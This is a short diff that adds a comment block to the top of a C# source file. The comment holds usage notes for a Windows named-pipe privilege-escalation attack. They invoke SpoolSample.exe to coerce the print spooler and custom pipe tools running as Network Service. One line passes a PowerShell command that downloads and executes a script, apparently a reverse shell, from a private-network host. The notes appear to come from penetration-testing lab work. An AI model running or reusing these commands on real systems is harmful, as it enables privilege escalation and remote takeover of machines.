@@ -1,3 +1,12 @@
+/*
+As  "NT AUTHORITY\Network Service"
+pipi3.exe \\.\pipe\test\pipe\spoolss
+pipi2.exe \\.\pipe\test\pipe\spoolss "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.49.71/rev-slim.txt')"
+
+
+SpoolSample.exe appsrv01 appsrv01/pipe/test
+*/
+
 using System;
 using System.Collections.Generic;
 using System.Linq;
